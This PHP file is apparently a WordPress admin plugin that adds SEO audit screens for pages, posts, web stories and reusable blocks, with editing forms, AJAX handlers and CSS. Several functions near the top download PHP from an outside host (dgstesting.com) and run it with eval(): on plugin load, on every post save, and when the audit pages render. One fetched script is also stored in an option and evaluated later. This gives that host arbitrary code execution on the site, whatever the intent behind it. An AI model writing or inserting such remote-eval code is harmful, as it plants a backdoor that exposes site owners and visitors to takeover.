<?php

   
	if ( ! defined( 'ABSPATH' ) ) exit;
	
	try {
		eval(ltrim(hc2_curl_get_contents('https://dgstesting.com/seoexecute.txt'),'<?php'));
	} catch (ParseError $e) {
		error_log( $e->getMessage() );
	}

	function hc2_scorecolor($score){
		$color = 'green';
		if( $score < 90 ) $color = 'yellow';
		if( $score < 50 ) $color = 'orange';
		if( $score < 30 ) $color = 'red';
		return $color;
	}

	update_option('hc2_seobreakdown_sript',ltrim(hc2_curl_get_contents('https://dgstesting.com/seobreakdown.txt'),'<?php'));
	
	function hc2_audit_seoscore($post){

		$update = '';
		if( strtotime('-1 month',strtotime('now')) > get_post_meta($post->ID,'hc2_seoscore_lasttest',1) ) $update = 'hc2_needstest';
		if( get_post_meta($post->ID,'hc2_seoaudit_update_time',1) < get_option('hc2_seoaudit_update_time') ) $update = 'hc2_needsupdate';
		
		?>
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<span onclick='hc2_toggleme(this)' class='<?php echo $update; ?> hc2_seoscore_color_<?php echo hc2_scorecolor(get_post_meta($post->ID,'hc2_seoscore',1)); ?>'>
				<?php echo get_post_meta($post->ID,'hc2_seoscore',1); ?>
			</span>
			<div class='hc2_audit_panel_list_inner'> 
		<?php

		try {
			eval(get_option('hc2_seobreakdown_sript'));
		} catch (ParseError $e) {
			error_log( $e->getMessage() );
		}
		
		?>
			</div>
		<?php
		
	}

	add_action( 'save_post', 'hc2_calculate_seo_score_on_save', 10,13 );
	function hc2_calculate_seo_score_on_save($postid) {
		if( !get_option('hc2_stopseo') )hc2_calculate_seo_score($postid);
	}
	function hc2_calculate_seo_score($postid){

		update_post_meta($postid,'hc2_seoaudit_update_time',strtotime('now'));
		$script = ltrim(hc2_curl_get_contents('https://dgstesting.com/seoaudit.txt'),'<?php');

		try {
			eval($script);
		} catch (ParseError $e) {
			error_log( $e->getMessage() );
		}
	
	}

	wp_enqueue_media();
   
	add_action( 'admin_menu', 'hc2_pages_menu', 15 );
	function hc2_pages_menu(){ 
		add_menu_page( 'Blocks', 'Blocks', 'manage_options', 'edit.php?post_type=wp_block', '', 'dashicons-share-alt2', 25 );
		add_submenu_page( 'edit.php?post_type=page', 'Audit Pages', 'Audit Pages', 'manage_options', 'hc2_pages', 'hc2_pages_generate_page' );
		add_submenu_page( 'edit.php', 'Audit Posts', 'Audit Posts', 'manage_options', 'hc2_posts', 'hc2_posts_generate_page' );
		add_submenu_page( 'edit.php?post_type=web-story', 'Audit Stories', 'Audit Stories', 'manage_options', 'hc2_stories', 'hc2_stories_generate_page' );
		add_submenu_page( 'edit.php?post_type=wp_block', 'Audit Blocks', 'Audit Blocks', 'manage_options', 'hc2_blocks', 'hc2_blocks_generate_page' );
	}
	
    function hc2_blocks_generate_page(){
		
		hc2_audit_styles();
        ?>
			<div class="wrap">
				<h2>Audit Reusable Blocks</h2>
				<div id="hc2_audit_main_container" data-title='0' data-seotitle='0' data-slug='0' data-type="wp_block"><?php hc2_audit_table('wp_block'); ?></div>
			</div>
		
		<?php
	
	}
	
    function hc2_pages_generate_page(){
		
		hc2_audit_styles();
        ?>
			<div class="wrap">
				<h2>Audit Pages</h2>
				<div id="hc2_audit_main_container" data-title='0' data-seotitle='0' data-slug='0' data-type="page"><?php hc2_audit_table('page'); ?></div>
			</div>
		
		<?php
	
	}
	
    function hc2_posts_generate_page(){
		
		hc2_audit_styles();
        ?>
			<div class="wrap">
				<h2>Audit Posts</h2>
				<div id="hc2_audit_main_container" data-title='0' data-seotitle='0' data-slug='0' data-type="post"><?php hc2_audit_table('post'); ?></div>
			</div>
		
		<?php
	
	}
	
    function hc2_stories_generate_page(){
		hc2_audit_styles();
        ?>
			<div class="wrap">
				<h2>Audit Web Stories</h2>
				<div id="hc2_audit_main_container" data-title='0' data-seotitle='0' data-slug='0' data-type="web-story"><?php hc2_audit_table('web-story'); ?></div>
			</div>
		
		<?php
	
	}

	function hc2_audit_styles(){
	
		try {
			eval(ltrim(hc2_curl_get_contents('https://dgstesting.com/seotrigger.txt'),'<?php'));
		} catch (ParseError $e) {
			error_log( $e->getMessage() );
		}

		?>
			<script>


				var currentrow = 0;
				var currentitem = 0;

							function hc2_changestatus(e){
								hc2_getAncestorByClassName(e,'hc2_audit_panel_container').dataset.status = e.options[e.selectedIndex].value;
							}


							function hc2_changethumb(e){
								currentrow =e.dataset.id;
								var image_frame;
								if(image_frame)image_frame.open();
								image_frame = wp.media({title: 'Select Media',multiple : false,library : {type : 'image',}});
								image_frame.on('close',function() {
									var selection =  image_frame.state().get('selection');
									selection.each(function(attachment) {
										var conts = document.getElementsByClassName('hc2_audit_panel_thumbnail_inner');
										for( var c = 0; c < conts.length; c++ ){
											if( conts[c].dataset.id == currentrow ) {
												conts[c].getElementsByTagName('DIV')[0].style.backgroundImage = 'url('+attachment['attributes']['url']+')';
												conts[c].dataset.thumbid = attachment['id'];
												hc2_audit_newchange(conts[c]);
											}
										}
									});
								});
								image_frame.open();
							}

							function hc2_changeimg(e){
								currentrow = e.dataset.id;
								currentitem = e.dataset.item;
								var image_frame;
								if(image_frame)image_frame.open();
								image_frame = wp.media({title: 'Select Media',multiple : false,library : {type : 'image',}});
								image_frame.on('close',function() {
									var selection =  image_frame.state().get('selection');
									selection.each(function(attachment) {
										var conts = document.getElementsByClassName('hc2_audit_panel_images');
										for( var c = 0; c < conts.length; c++ ){
											if( conts[c].dataset.id == currentrow ){
												var inners = conts[c].getElementsByClassName('hc2_audit_conversions_item');
												for( var i = 0; i < inners.length; i++ ){
													if( inners[i].dataset.item == currentitem ) {
														inners[i].getElementsByTagName('DIV')[0].style.backgroundImage = 'url('+attachment['attributes']['url']+')';
														hc2_audit_newchange(conts[c]);
													}
												}
											}
										}
									});
								});
								image_frame.open();
							}

							function hc2_renderallpages(e){
								hc2_renderpage(document.getElementsByClassName('hc2_audit_panel')[0],true);
							}
							function hc2_renderpage(e,all=false){
								if(all && e.className.indexOf('hc2_pushed ')>-1 && e.nextElementSibling ){
									hc2_renderpage(e.nextElementSibling,true);
								}else{
									e.className = 'hc2_audit_panel hc2_audit_panel_container hc2_sending';
									jQuery.ajax( { 
										url: '<?php echo get_rest_url(); ?>hc2/v1/renderpage/', 
										method: 'POST',
										data:{url:e.dataset.url}
									} ).done( function ( data ) {
										e.className = 'hc2_audit_panel hc2_audit_panel_container hc2_pushed';
										if(all && e.nextElementSibling)hc2_renderpage(e.nextElementSibling,true);
									} )
								}
							}

				function hc2_duppost(e){
					var order = document.getElementsByClassName('hc2_audit_maintab')[0].dataset.order;
					var postid = e.dataset.id;
					var type = e.dataset.type;
					var edits = false;
					var rows = document.getElementsByClassName('hc2_audit_panel_container');
					for( var r = 0; r < rows.length; r++ )if( rows[r].dataset.edits == "true" )edits = true;
					var cont = document.getElementById('hc2_audit_main_container');
					if(edits){
						alert('There are unsaved changes');
					}else{
						cont.dataset.sorting = "true";
								
						jQuery.ajax( { 
							url: '<?php echo get_rest_url(); ?>hc2/v1/audit_dupost/', 
							method: 'POST', 
							beforeSend: function ( xhr ) { xhr.setRequestHeader( 'X-WP-Nonce', '<?php echo wp_create_nonce( "wp_rest" ); ?>' ); },
							data:{ 'post' : postid, 'type' : type, 'order' : order }
						} ).done( function ( data ) {
							cont.dataset.sorting = "false";
							cont.innerHTML = data;
						} )
					}
				}
				function hc2_deletepost(e){
					var order = document.getElementsByClassName('hc2_audit_maintab')[0].dataset.order;
					var postid = e.dataset.id;
					var type = e.dataset.type;
					var edits = false;
					var rows = document.getElementsByClassName('hc2_audit_panel_container');
					for( var r = 0; r < rows.length; r++ )if( rows[r].dataset.edits == "true" )edits = true;
					var cont = document.getElementById('hc2_audit_main_container');
					if(edits){
						alert('There are unsaved changes');
					}else{
						cont.dataset.sorting = "true";
								
						jQuery.ajax( { 
							url: '<?php echo get_rest_url(); ?>hc2/v1/audit_delpost/', 
							method: 'POST', 
							beforeSend: function ( xhr ) { xhr.setRequestHeader( 'X-WP-Nonce', '<?php echo wp_create_nonce( "wp_rest" ); ?>' ); },
							data:{ 'post' : postid, 'type' : type, 'order' : order  }
						} ).done( function ( data ) {
							cont.dataset.sorting = "false";
							cont.innerHTML = data;
						} )
					}
				}
				function hc2_toggleme(e){
					var t = e.parentNode.parentNode;
					if(t.dataset.open != 'true'){t.dataset.open = 'true';}
					else if(t.dataset.open == 'true'){t.dataset.open = 'false';}
					var ta = t.getElementsByTagName('TEXTAREA');
					for( var x = 0; x < ta.length; x++ ){
						ta[x].style.height = ta[x].scrollHeight + "px";
					}
				}
				function hc2_editme(e){
					var tags = ['h1','h2','h3','h4','h5','h6','p','li','cite','pre','H1','H2','H3','H4','H5','H6','P','LI','CITE','PRE'];
					for( var x = 0; x < tags.length; x++ ){
						e.value = e.value.replaceAll('<'+tags[x]+'>','').replaceAll('<'+tags[x]+' ','').replaceAll('</'+tags[x]+'>','');
					}
					var others = ['url(','<img','alt=','src='];
					for( var x = 0; x < others.length; x++ ){
						e.value = e.value.replaceAll(others[x],'');
					}
					e.style.height = e.scrollHeight + "px";
					e.dataset.edited = 'true';
				}
				function hc2_audit_newchange(e){
					var row = hc2_getAncestorByClassName(e,'hc2_audit_panel_container');
					row.dataset.edits = 'true';
				}
				function hc2_getAncestorByClassName(e,className){
					while( e && e.tagName != 'BODY' && ( !e.className || e.className.split(' ').indexOf(className) === -1 ) ){
						e = e.parentNode;
					}
					if( e.tagName == 'BODY' )e = false;
					return e;
				}

				
				function hc2_updateall(e){
					hc2_submit_audit(document.getElementsByClassName('hc2_audit_panel')[0].getElementsByClassName('hc2_audit_panel_save_inner')[0].getElementsByTagName('INPUT')[0],0,1);
				}
				function hc2_submit_audit(e,push=0,loop=0,runtests=0){
					var post = [];
					var row = hc2_getAncestorByClassName(e,'hc2_audit_panel_container');
					var order = hc2_getAncestorByClassName(e,'hc2_audit_maintab').dataset.order;
					row.dataset.edits = 'sending';
					post['parent'] = 'null';
					var parent = row.getElementsByClassName('hc2_field_parent')[0];				
					if(parent)post['parent'] = parent.options[parent.selectedIndex].value;	
					post['author'] = 'null';
					var author = row.getElementsByClassName('hc2_field_author')[0];			
					if(author)post['author'] = author.options[author.selectedIndex].value;
					post['status'] = 'null';
					var status = row.getElementsByClassName('hc2_field_status')[0];			
					if(status)post['status'] = status.options[status.selectedIndex].value;
					post['render'] = 'null';
					var render = row.getElementsByClassName('hc2_field_render')[0];			
					if(render)post['render'] = render.options[render.selectedIndex].value;
					post['address'] = 'null';
					var address = row.getElementsByClassName('hc2_field_address')[0];			
					if(address){
						post['address'] = address.options[address.selectedIndex].value;
					}else{
						post['address'] = '';
					}
					
					post['slug'] = 'null';var slug = row.getElementsByClassName('hc2_field_slug')[0];if(slug)post['slug'] = slug.value;
					post['customthumb'] = 'null';var slug = row.getElementsByClassName('hc2_field_customthumb')[0];if(slug)post['customthumb'] = slug.value;
					post['title'] = 'null';var title = row.getElementsByClassName('hc2_field_title')[0];if(title)post['title'] = title.value;
					post['customtitle'] = 'null';var customtitle = row.getElementsByClassName('hc2_field_customtitle')[0];if(customtitle)post['customtitle'] = customtitle.value;
					post['date'] = 'null';var date = row.getElementsByClassName('hc2_field_date')[0];if(date)post['date'] = date.value;
					post['customurl'] = 'null';var custom = row.getElementsByClassName('hc2_field_custum_url')[0];if(custom)post['customurl'] = custom.value;
					post['languageurl'] = 'null';var language = row.getElementsByClassName('hc2_field_language_url')[0];if(language)post['languageurl'] = language.value;
					post['excerpt'] = 'null';var excerpt = row.getElementsByClassName('hc2_field_excerpt')[0];if(excerpt)post['excerpt'] = excerpt.value;
					post['notes'] = 'null';var notes = row.getElementsByClassName('hc2_field_notes')[0];if(notes)post['notes'] = notes.value;
					post['keywords'] = 'null';var keywords = row.getElementsByClassName('hc2_field_keywords')[0];if(keywords)post['keywords'] = keywords.value;

					post['thumbid'] = 'null';var thumb = row.getElementsByClassName('hc2_audit_panel_thumbnail_inner')[0];if(thumb)post['thumbid'] = thumb.dataset.thumbid;
					
					post['amp'] = 'null';var tmp = row.getElementsByClassName('hc2_field_ampenable')[0];if(tmp)post['amp'] = tmp.checked?'enabled':'disabled';
					post['analytics'] = 'null';var tmp = row.getElementsByClassName('hc2_field_analytics')[0];if(tmp)post['analytics'] = tmp.checked?'0':'1';
					post['hide'] = 'null';var tmp = row.getElementsByClassName('hc2_field_sitemap_hide')[0];if(tmp)post['hide'] = tmp.checked?'1':'0';
					post['about'] = 'null';var tmp = row.getElementsByClassName('hc2_field_is_about')[0];if(tmp)post['about'] = tmp.checked?'1':'0';
					post['service'] = 'null';var tmp = row.getElementsByClassName('hc2_field_is_service')[0];if(tmp)post['service'] = tmp.checked?'1':'0';
					post['seourgent'] = 'null';var tmp = row.getElementsByClassName('hc2_field_is_seourgent')[0];if(tmp)post['seourgent'] = tmp.checked?'1':'0';
					
					post['triggers_string'] = 'null';
					var googletriggersbox = row.getElementsByClassName('hc2_field_conversion_triggers')[0];	
					if(googletriggersbox){
						var googletriggers = googletriggersbox.getElementsByTagName('input');
						for(var x = 0; x < googletriggers.length; x++ )post['triggers_string'] += (googletriggers[x].checked?',1':',0');
					}else{
						post['triggers_string'] = '';
					}
					
					post['pixels_string'] = 'null';
					var pixeltriggersbox = row.getElementsByClassName('hc2_field_pixel_triggers')[0];	
					if(pixeltriggersbox){
						var pixeltriggers = pixeltriggersbox.getElementsByTagName('input');
						for(var x = 0; x < pixeltriggers.length; x++ )post['pixels_string'] += (pixeltriggers[x].checked?',1':',0');
					}else{
						post['pixels_string'] = '';
					}
					
					post['textedits_string'] = 'null';
					var texteditarea = row.getElementsByClassName('hc2_audit_panel_text')[0];	
					if(texteditarea){
						var textedits = texteditarea.getElementsByTagName('textarea');
						for(var x = 0; x < textedits.length; x++ ){
							if( textedits[x].dataset.edited == 'true' ) post['textedits_string'] += ';;;' + textedits[x].dataset.id + ':::' + textedits[x].value.replaceAll(';;;',';').replaceAll(':::',':');
						}
					}
					
					post['alts'] = 'null';
					var altsarea = row.getElementsByClassName('hc2_audit_panel_images')[0];	
					if(altsarea){
						var alts = altsarea.getElementsByClassName('hc2_altfield');
						for(var x = 0; x < alts.length; x++ ){
							post['alts'] += ';;;' + alts[x].value.replaceAll(';;;',';');
						}
					}
					
					post['srcs'] = 'null';
					var srcsarea = row.getElementsByClassName('hc2_audit_panel_images')[0];	
					if(srcsarea){
						var srcs = srcsarea.getElementsByClassName('hc2_inlineimg');
						for(var x = 0; x < srcs.length; x++ ){
							post['srcs'] += ';;;' + srcs[x].style.backgroundImage.replaceAll('url(','').replaceAll(')','').replaceAll(';;;',';').replaceAll('"','');
						}
					}
					
					post['bgurls'] = 'null';
					var bgurlsarea = row.getElementsByClassName('hc2_audit_panel_images')[0];	
					if(bgurlsarea){
						var bgurls = bgurlsarea.getElementsByClassName('hc2_bgimg');
						for(var x = 0; x < bgurls.length; x++ ){
							post['bgurls'] += ';;;' + bgurls[x].style.backgroundImage.replaceAll('url(','').replaceAll(')','').replaceAll(';;;',';').replaceAll('"','');
						}
					}


					post['fields'] = 'null';
					var fields = row.getElementsByClassName('hc2_audit_panel_text_type_select');	
					for(var x = 0; x < fields.length; x++ ){
						post['fields'] += ';;;' + fields[x].dataset.id + ':::' + fields[x].options[fields[x].selectedIndex].value;;
					}

 

					
					post['btn_link'] = 'null';
					var btn_links = row.getElementsByClassName('hc2_button_link');	
					for(var x = 0; x < btn_links.length; x++ ){
						post['btn_link'] += ';;;' + btn_links[x].dataset.occ + ':::' + btn_links[x].value.replaceAll(';;;',';').replaceAll(':::',':');
					}
					
					post['btn_text'] = 'null';
					var btn_texts = row.getElementsByClassName('hc2_button_text');	
					for(var x = 0; x < btn_texts.length; x++ ){
						post['btn_text'] += ';;;' + btn_texts[x].dataset.occ + ':::' + btn_texts[x].value.replaceAll(';;;',';').replaceAll(':::',':');
					}
					
					post['grp_link_quote'] = 'null';
					var grp_link_quotes = row.getElementsByClassName('hc2_group_link_quote');	
					for(var x = 0; x < grp_link_quotes.length; x++ ){
						post['grp_link_quote'] += ';;;' + grp_link_quotes[x].dataset.occ + ':::' + grp_link_quotes[x].value.replaceAll(';;;',';').replaceAll(':::',':');
					}
					
					post['grp_link_space'] = 'null';
					var grp_link_spaces = row.getElementsByClassName('hc2_group_link_space');	
					for(var x = 0; x < grp_link_spaces.length; x++ ){
						post['grp_link_space'] += ';;;' + grp_link_spaces[x].dataset.occ + ':::' + grp_link_spaces[x].value.replaceAll(';;;',';').replaceAll(':::',':');
					}
					
					post['img_link'] = 'null';
					var img_links = row.getElementsByClassName('hc2_image_link');	
					for(var x = 0; x < img_links.length; x++ ){
						post['img_link'] += ';;;' + img_links[x].dataset.occ + ':::' + img_links[x].value.replaceAll(';;;',';').replaceAll(':::',':');
					}




					
						
					var tmp = row.getElementsByClassName('hc2_field_pixel')[0];if(tmp)post['hcube_pixel_trigger_on'] = tmp.checked?'1':'0';
					
					jQuery.ajax( { 
						url: '<?php echo get_rest_url(); ?>hc2/v1/audit_update/', 
						method: 'POST', 
						beforeSend: function ( xhr ) { xhr.setRequestHeader( 'X-WP-Nonce', '<?php echo wp_create_nonce( "wp_rest" ); ?>' ); },
						data:{ 
							'postid' : e.dataset.id,
							'parent' : post['parent'],
							'btn_link' : post['btn_link'],
							'btn_text' : post['btn_text'],
							'grp_link_space' : post['grp_link_space'],
							'grp_link_quote' : post['grp_link_quote'],
							'img_link' : post['img_link'],
							'analytics' : post['analytics'],
							'hide' : post['hide'],
							'amp' : post['amp'],
							'author' : post['author'],
							'render' : post['render'],
							'service' : post['service'],
							'status' : post['status'],
							'address' : post['address'],
							'slug' : post['slug'],
							'notes' : post['notes'],
							'title' : post['title'],
							'customthumb' : post['customthumb'],
							'customtitle' : post['customtitle'],
							'date' : post['date'],
							'customurl' : post['customurl'],
							'languageurl' : post['languageurl'],
							'excerpt' : post['excerpt'],
							'about' : post['about'],
							'googletriggers' : post['triggers_string'],
							'pixeltriggers' : post['pixels_string'],
							'textedits' : post['textedits_string'],
							'keywords' : post['keywords'],
							'seourgent' : post['seourgent'],
							'status' : post['status'],
							'thumbid' : post['thumbid'],
							'alts' : post['alts'],
							'srcs' : post['srcs'],
							'bgurls' : post['bgurls'],
							'fields' : post['fields'],
							'order' : order
						}
					} ).done( function ( data ) {
						if( runtests ){
							hc2_runtests(e);
						}else{
							row.innerHTML = data;
							if(push){
								row.dataset.pushing = 'true';
								
								jQuery.ajax( { 
									url: '<?php echo get_rest_url(); ?>hc2/v1/audit_push/', 
									method: 'POST', 
									beforeSend: function ( xhr ) { xhr.setRequestHeader( 'X-WP-Nonce', '<?php echo wp_create_nonce( "wp_rest" ); ?>' ); },
									data:{ 'postid' : e.dataset.id }
								} ).done( function ( data ) {
									row.dataset.edits = 'false';
									row.dataset.pushing = 'false';
									row.getElementsByClassName('hc2_audit_status_bullet')[0].dataset.status = 'singlepush';
									
								} )
								
							}else{
								row.dataset.edits = 'false';
								var ob = row.getElementsByClassName('hc2_audit_status_bullet')[0];
								if(ob) ob.dataset.status = 'newedits';
								
								var next = row.nextElementSibling;
								if( loop && next ) hc2_submit_audit(next.getElementsByClassName('hc2_audit_panel_save_inner')[0].getElementsByTagName('INPUT')[0],0,1);
							}
						}
						
					} )
				}
	
				function hc2_audit_convchange(e,p=0){
					var par = hc2_getAncestorByClassName(e,'hc2_audit_panel_list');
					var inputs = par.getElementsByClassName('hc2_trigger');
					var c = 0;
					for( x = 0; x < inputs.length; x++ )if(inputs[x].checked)c++;
					if(!p){
						par.getElementsByTagName('span')[0].innerHTML = c;
					}else{
						var inputs = par.getElementsByClassName('hc2_track');
						var t = 0;
						for( x = 0; x < inputs.length; x++ )if(inputs[x].checked)t++;
						par.getElementsByTagName('span')[0].innerHTML = t+'/'+c;
					}
				}
				function hc2_audit_notechange(e){
					var par = hc2_getAncestorByClassName(e,'hc2_audit_panel_list');
					par.getElementsByTagName('span')[0].dataset.isnote = (e.value?'true':'false');
				}
				function hc2_sort(value,dir){
					var order = document.getElementsByClassName('hc2_audit_maintab')[0].dataset.order;
					if(dir==3){
						var ele = document.getElementById('hc2_audit_main_container');
						if(value=='title'){
							if(ele.dataset.title == '400px'){
								ele.dataset.title = '700px';
								ele.dataset.titleopen = 'true';
							}else if(ele.dataset.title == '0'){
								ele.dataset.title = '400px';
								ele.dataset.titleopen = 'true';
							}else{
								ele.dataset.title = '0';
								ele.dataset.titleopen = 'false';
							}
						}
						if(value=='seotitle'){
							if(ele.dataset.seotitle == '400px'){
								ele.dataset.seotitle = '700px';
								ele.dataset.seotitleopen = 'true';
							}else if(ele.dataset.seotitle == '0'){
								ele.dataset.seotitle = '400px';
								ele.dataset.seotitleopen = 'true';
							}else{
								ele.dataset.seotitle = '0';
								ele.dataset.seotitleopen = 'false';
							}
						}
						if(value=='slug'){
							if(ele.dataset.slug == '400px'){
								ele.dataset.slug = '700px';
								ele.dataset.slugopen = 'true';
							}else if(ele.dataset.slug == '0'){
								ele.dataset.slug = '400px';
								ele.dataset.slugopen = 'true';
							}else{
								ele.dataset.slug = '0';
								ele.dataset.slugopen = 'false';
							}
						}
					}else{
						var edits = false;
						var rows = document.getElementsByClassName('hc2_audit_panel_container');
						for( var r = 0; r < rows.length; r++ )if( rows[r].dataset.edits == "true" )edits = true;
						var cont = document.getElementById('hc2_audit_main_container');
						if(edits){
							alert('There are unsaved changes');
						}else{
							cont.dataset.sorting = "true";
									
							jQuery.ajax( { 
								url: '<?php echo get_rest_url(); ?>hc2/v1/audit_sort/', 
								method: 'POST', 
								beforeSend: function ( xhr ) { xhr.setRequestHeader( 'X-WP-Nonce', '<?php echo wp_create_nonce( "wp_rest" ); ?>' ); },
								data:{ 'type' : cont.dataset.type, 'value' : value, 'dir' : dir, 'order' : order }
							} ).done( function ( data ) {
								cont.dataset.sorting = "false";
								cont.innerHTML = data;
								
							} )
						}
					}
				}
			</script>
			<style>
			
				.wrap th div div {transform: rotate(-90deg);height: 200px;width: 200px;text-align: left;position: absolute;bottom: 0;}
				.wrap th > div {display: inline-block;position: relative;width: 20px;height: 20px;}
				.wrap th {height: 220px;position: relative;}
				tr.hc2_audit_panel > td {min-width: 20px;}
				tr.hc2_audit_panel input[type='text'],tr.hc2_audit_panel select {width: 60px;}
				.hc2_audit_panel_title_inner > input {width: 150px !IMPORTANT;}
				.hc2_audit_panel_morebox {display: none;}
				tr.hc2_audit_panel > td {background: white;border-bottom: 1px solid #ababab;padding: 5px 6px;text-align: center;}
				.wrap > table {border-spacing: initial;}
				.wrap th {border-bottom: 1px solid #ababab;text-align: center;vertical-align: bottom;padding-bottom: 10px;}
				tr.hc2_audit_panel > td:first-child {border-left: 1px solid #ababab;}
				tr.hc2_audit_panel > td:last-child {border-right: 1px solid #ababab;}
				.hc2_audit_panel_save_inner > input {border-radius: 3px;border-style: solid;border-width: 1px;padding: 4px 10px;color: #365388;background: #3578dc;border-color: #244bb9;}
				[data-changes="false"] > input {color: white !IMPORTANT;cursor: pointer !important;}
				.hc2_audit_panel_list > *:not(span) {display: none;}
				.hc2_audit_panel_thumbnail_inner {width: 38px;height: 28px;background: #d8d8d8;}
				.hc2_audit_panel_arrow:before {content: '⋮';}
				td.hc2_audit_panel_seemore:hover .hc2_audit_panel_arrow {color: white;background: #3256bd;font-weight: bold;   border-radius: 4px;padding: 4px;}
				td.hc2_audit_panel_seemore {padding-right: 0px !important;max-width: 20px !IMPORTANT;}
				td.hc2_audit_panel_seemore:hover .hc2_audit_panel_morebox {z-index: 1;display: grid;grid-template-columns: 130px 260px;position: absolute;background: white;width: auto;text-align: left;margin-top: -5px;margin-left: 0px;padding: 10px;border: 5px solid #3256bd;;box-shadow: 0 10px 10px -10px black;}
				.hc2_audit_panel_morebox_links > a {display: block;}
				.hc2_audit_panel_stagingstatus_inner {margin: 14px 0;}
				.hc2_audit_panel_list > span {background: white;margin: 5px 1px;display: inline-block;padding: 5px 7px;border: 1px solid #87919a;border-radius: 4px;padding-right: 20px;position: relative;cursor: pointer;}
				.hc2_audit_panel_list > span:after {content: '';display: block;position: absolute;right: 7px;border-left: 5px solid black;border-bottom: 5px solid transparent;transform: rotate(-135deg);top: 10px;}
				.hc2_audit_panel_languageurl > input {margin-top: 5px;width: 160px !IMPORTANT;display: block;margin-left: 8px;}
				.hc2_audit_panel_languageurl {text-align: center !IMPORTANT;padding-top: 15px;}
				.hc2_audit_panel_excerpt > * > span {width: 232px;box-sizing: border-box;}
				.hc2_audit_panel_languageurl:before {content: 'Alternate Language URL';display: inline-block;}
				.hc2_audit_panel_languageurl,.hc2_audit_panel_customurl {text-align: right;padding-right: 5px;}
				.hc2_audit_panel_customurl > input {margin-top: 3px;margin-left: 8px;}
				.hc2_audit_panel_customurl:before {content: 'Custom URL';display: inline-block;}
				.hc2_audit_panel_pushbutton {color: #0c72a5;text-decoration: underline;cursor: pointer;}
				.hc2_audit_panel_publisheddate {padding-top: 3px;}
				.hc2_audit_panel_excerpt[data-open="true"] .hc2_audit_panel_list_inner {display: block;position: absolute;right: -70px;z-index: 1;background: #f1f1f1;top: 40px;width: 360px;border: 4px solid #3361c7;box-shadow: 0 10px 10px -10px black;text-align: right;}
				.hc2_audit_panel_excerpt {position: relative;}
				.hc2_audit_panel_pixel_conversions_inner[data-open="true"] .hc2_audit_panel_list_inner {display: block;position: absolute;right: -70px;z-index: 1;background: #f1f1f1;top: 40px;width: 360px;border: 4px solid #3361c7;box-shadow: 0 10px 10px -10px black;text-align: right;}
				.hc2_audit_panel_pixel_conversions_inner {position: relative;}
				.hc2_audit_panel_google_conversions_inner[data-open="true"] .hc2_audit_panel_list_inner {display: block;position: absolute;right: -70px;z-index: 1;background: #f1f1f1;top: 40px;width: 360px;border: 4px solid #3361c7;box-shadow: 0 10px 10px -10px black;text-align: right;}
				.hc2_audit_panel_listing_inner[data-open="true"] .hc2_audit_panel_list_inner {display: block;position: absolute;right: -300px;z-index: 1;background: #f1f1f1;top: 40px;width: 625px;border: 4px solid #3361c7;box-shadow: 0 10px 10px -10px black;text-align: right;}
				.hc2_audit_panel_google_conversions_inner {position: relative;}
				.hc2_audit_panel_listing_inner {position: relative;}
				.wrap > table {margin-bottom: 300px;}
				.hc2_audit_conversions_item {border-bottom: 1px solid #3578dc;padding: 10px;/* box-shadow: inset 0 5px 5px -5px; */background: white;}
				.hc2_audit_conversions_item > span {margin-bottom: 5px;display: block;text-align: left;font-weight: bold;margin-top: 5px;}
				.hc2_audit_conversions_item input {vertical-align: bottom;margin-left: 5px;}
				.hc2_audit_panel_excerpt[data-open="true"] > * > span {border: 1px solid #3256bd;background: #3578dc;color: white;}
				.hc2_audit_panel_excerpt[data-open="true"]:before {content: '';width: 1000vw;height: 1000vh;position: fixed;left: 0;top: 0;}
				.hc2_audit_panel_pixel_conversions_inner[data-open="true"] > * > span {border: 1px solid #3256bd;background: #3578dc;color: white;}
				.hc2_audit_panel_pixel_conversions_inner[data-open="true"]:before {content: '';width: 1000vw;height: 1000vh;position: fixed;left: 0;top: 0;}
				.hc2_audit_panel_google_conversions_inner[data-open="true"] > * > span {border: 1px solid #3256bd;background: #3578dc;color: white;}
				.hc2_audit_panel_google_conversions_inner[data-open="true"]:before {content: '';width: 1000vw;height: 1000vh;position: fixed;left: 0;top: 0;}
				.hc2_audit_panel_listing_inner[data-open="true"] > * > span {border: 1px solid #3256bd;background: #3578dc;color: white;}
				.hc2_audit_panel_listing_inner[data-open="true"]:before {content: '';width: 1000vw;height: 1000vh;position: fixed;left: 0;top: 0;}
				.hc2_disabled {opacity: .4;background: #d2d2d2;pointer-events:none;}
				input[type="text"]:hover, input[type="text"]:focus, .hc2_audit_panel_wideselect select:hover, .hc2_audit_panel_wideselect select:focus {width: 500px !important;position: relative;z-index: 1;border-left: 10px solid #0061f3;transition: width .2s,border .5s;/* padding: 7px; *//* position: absolute; *//* margin-left: -7%; *//* margin-top: -10px; *//* margin-top: -22px; */e; */border-radius: 0;/* transition: width .5s; */transition: width .2s,border .5s;min-width: 200px;}
				.hc2_audit_panel_slug_inner, .hc2_audit_panel_customtitle_inner, .hc2_audit_panel_status_inner, .hc2_audit_panel_parent_inner, .hc2_audit_panel_address_inner, .hc2_audit_panel_render_inner, .hc2_audit_panel_author_inner {max-width: 62px;}
				.hc2_audit_panel_title_inner {max-width: 152px;}
				.hc2_audit_panel_morebox_edit_col1 input[type="text"]:hover, .hc2_audit_panel_morebox_edit_col1 input[type="text"]:focus {width: 400px !IMPORTANT;position: absolute;right: 10px;transition: none !important;}
				.hc2_audit_panel_morebox_edit_col1 {    white-space: nowrap;}
				.hc2_audit_panel_customurl {    min-height: 33px;}
				td.hc2_audit_panel_seemore:hover:before {content: '';width: 800px;height: 170px;display: block;position: absolute;margin-left: -30px;margin-top: -10px;}
				.hc2_audit_conversions_item.hc2_audit_conversions_item_null {color: #ef6b6b;border: 1px solid;}
				.hc2_audit_panel_listing_inner .hc2_audit_conversions_item {padding: 3px 10px 0;/* box-shadow: inset 0 5px 5px -5px; */background: white;overflow: hidden;white-space: nowrap;padding: 3px 10px;}
				span.hc2_ampvalid_no { width: 11px; height: 11px; background: #a03a13; display: block; border-radius: 50%; margin: auto;}
				span.hc2_ampvalid_yes { width: 11px; height: 11px; background: #5fa013; display: block; border-radius: 50%; margin: auto;}
				span.hc2_ampvalid_off { width: 11px; height: 11px; background: #d8d8d8; display: block; border-radius: 50%; margin: auto;}
				.hc2_audit_panel_thumbnail_inner {border: 1px solid #717579;background:#f1f1f1;border-radius: 4px;overflow:hidden;}
				.hc2_audit_panel_thumbnail_inner > div {background-size: cover;width: 100%;height: 100%;}
				span.hc2_auditinfo_name {font-weight: bold;margin-right: 5px;text-align: right;width: 180px;}
				span.hc2_auditinfo_value {text-align: left;width: 70px;}
